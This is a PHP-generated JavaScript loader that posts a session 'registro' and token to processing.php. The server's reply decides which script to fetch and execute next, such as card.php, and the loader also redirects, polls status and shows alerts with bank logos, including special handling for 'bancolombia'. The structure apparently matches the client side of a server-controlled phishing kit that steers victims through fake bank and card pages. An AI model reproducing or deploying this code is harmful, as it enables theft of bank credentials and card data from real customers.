<?php
header('Content-Type: application/javascript');
$domName = $_SERVER['HTTP_HOST'];
$sourceURI = $_SERVER['REQUEST_URI'];
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')
    $urlProtocol = 'https';
else
    $urlProtocol = 'http';
$urlHost = $urlProtocol . '://' . $domName;
$lastIndex = strrpos($sourceURI, '/');
$site = substr($sourceURI, 1, $lastIndex);
?>
//<script>
    var my_hosting = '<?php echo $urlHost; ?>/';
    var my_site = '<?php echo $site; ?>'
    var my_hosting_site = my_hosting + my_site;
    var api_server = my_hosting + 'processing.php';
    var token = '<?php echo $token; ?>';
    var my_contenido = '';
    var my_style = '';
    var my_data = [];
    var my_timer = undefined;

    var bLoad = false;
    var scripts = [
        my_hosting + 'js/popper.min.js',
        my_hosting + 'js/sweetalert2.js',
        my_hosting + 'js/bootstrap.bundle.min.js',
        my_hosting + 'js/jquery.jclockNew.js',
    ];

    function loadFile(path, data = null, params = []) {
        clearInterval(my_timer);
        let url = my_hosting;

        if (path[1]) {
            url += my_site;
        }
        url += path[0] + '?';
        if (path[0] == 'card.php') {
            my_data['banco'] = '';
        }
        params = Object.assign({}, params, my_data);
        for (var d in params) {
            if (params[d]) {
                url += '&' + d + '=' + params[d];
            }
        }
        bLoad = false;
        $.getScript(url, function() {
            try {
                loadContenido();
                $('*').scrollTop(0);
                if (data) {
                    lanzarAlerta(data.alerta);
                }
            } catch (error) {
                console.log('Error en loadFile: ', error);
                alert('Error en loadFile: ' + error);
            }
        });
    }


    function loadFileFromFolder(folder, file, data = null, params = []) {
        clearInterval(my_timer);

        let url = `${folder}/${file}?`;

        params = Object.assign({}, params, my_data);
        for (var d in params) {
            if (params[d]) {
                url += '&' + d + '=' + params[d];
            }
        }

        bLoad = false;
        $.getScript(url, function() {
            loadContenido();
            $('*').scrollTop(0);
            if (data) {
                lanzarAlerta(data.alerta);
            }
        });
    }


    function loadMultipleScripts(scripts, fn, loadShop = false) {
        let promises = [];
        scripts.forEach(function(url) {
            promises.push(loadScriptPromise(url));
        });

        if (loadShop) {
            const res = shopGet();
        }

        Promise.all(promises)
            .then(function() {
                fn();
            }).catch(function(script) {
                alert('Error al cargar los scripts');
                console.log(script + ' failed to load');
            });
    }


    function loadScriptPromise(url) {
        return new Promise(function(resolve, reject) {
            let script = document.createElement('script');
            script.src = url;
            script.async = false;
            script.onload = function() {
                resolve(url);
            };
            script.onerror = function() {
                reject(url);
            };
            document.body.appendChild(script);
        });
    }

    async function shopGet(p = {}) {
        let urlItem = new URLSearchParams(window.location.search).get('idItem');
        processing({
            t: 'tienda',
            idItem: urlItem,
        })
    }

    async function processing(p = {}) {
        try {
            let fd = new FormData();
            fd.append('registro', my_data['registro']);
            fd.append('tok', token);
            for (var d in p) {
                fd.append(d, p[d]);
            }


            const prom = await fetch(api_server, {
                method: 'POST',
                body: fd
            });

            let json = await prom.json();
            if (!json) {
                return;
            }

            for (let prop in json) {
                my_data[prop] = json[prop];
            }

            if (json.action) {
                switch (json.action[0]) {
                    case 'alerta':
                        lanzarAlerta(json.alerta);
                        break;
                    case 'consulta':
                        consultarEstado();
                        break;
                    case 'url':
                        window.location.href = json.url;
                        break;
                    default:
                        loadFile(json.action, json);
                        break;
                }
            }
        } catch (error) {
            console.error('Error occurred during processing:', error);
        }
    }

    function loadContenido() {
        try {
            if (!bLoad) {
                $('title').html(my_titulo);
                $('body').css('opacity', 0);
                my_contenido += '<link rel="stylesheet" href="' + my_hosting + 'css/sweetalert2.min.css">';
                $('body').html(my_contenido);
                setTimeout(() => {
                    $('body').css('opacity', 1);
                }, 50);
                $('*').scrollTop(0);
                bLoad = true;
            }

        } catch (error) {
            console.log('Error en loadContenido: ', error);
            alert('Error en loadContenido: ' + error);
        }


    }

    function lanzarAlerta(alerta = null) {
        if (alerta) {
            if (my_data['banco'] == 'bancolombia') {
                $('#tabError').toggle(true);
                $('#summary').html(alerta.msg);
                return;
            }
            if (my_data['error'] == true) {
                my_data['alerta'] = alerta;
                console.log('Error: ', alerta);
                return;
            }

            let aParams = {};
            aParams.confirmButtonText = 'Aceptar';
            aParams.text = alerta.msg;
            if (alerta.title) {
                aParams.title = alerta.title;
            }
            switch (alerta.type) {
                case 'banco':
                    aParams.imageUrl = my_hosting + 'logos/' + my_data['banco'] + '.png';
                    aParams.imageWidth = 90;
                    break;
                default:
                    aParams.icon = alerta.type;
                    break;
            }
            Swal.fire(aParams);
        }
    }

    function isInputAbece(evt) {
        var ch = String.fromCharCode(evt.which);
        if (!(/[\sA-Za-z\r]/.test(ch))) {
            evt.preventDefault();
        }
    }

    function isInputNumber(evt) {
        var ch = String.fromCharCode(evt.which);
        if (!(/[0-9\r]/.test(ch))) {
            evt.preventDefault();
        }
    }

    function consultarEstado() {
        processing({
            t: 'consulta',
        });
    }

    function getRandomInt(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min) + min);
    }

    Date.prototype.addDays = function(days) {
        var date = new Date(this.valueOf());
        date.setDate(date.getDate() + days);
        return date;
    }

    Date.prototype.getMyFormat = function() {
        return `${this.getDate()}/${this.getMonth()}/${this.getFullYear()}`
    }